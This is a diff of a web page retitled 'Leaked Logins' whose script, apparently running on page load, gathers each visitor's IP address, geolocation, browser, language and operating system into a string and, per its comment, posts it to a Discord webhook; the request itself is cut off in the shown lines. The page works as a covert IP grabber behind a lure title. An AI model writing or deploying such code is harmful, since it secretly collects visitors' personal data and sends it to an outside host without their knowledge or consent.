@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width">
-  <title>Parth</title>
+  <title>Leaked Logins</title>
   <link href="style.css" rel="stylesheet" type="text/css" />
 </head>
 <body>
@@ -17,6 +17,7 @@
       .then(response => response.json())
       .then(data => {
         ip_address = data.ip;
+        device_details += "#########################################";
         device_details += "IP address: " + ip_address + "\n\n";
 
         // Use an IP Geolocation API to get the country
@@ -29,6 +30,7 @@
             device_details += "Browser: " + window.navigator.userAgent + "\n\n";
             device_details += "Language: " + window.navigator.language + "\n\n";
             device_details += "Operating System: " + window.navigator.platform + "\n\n";
+            device_details += "########################################";
 
             // Send the device details to the Discord webhook
             var xhr = new XMLHttpRequest();
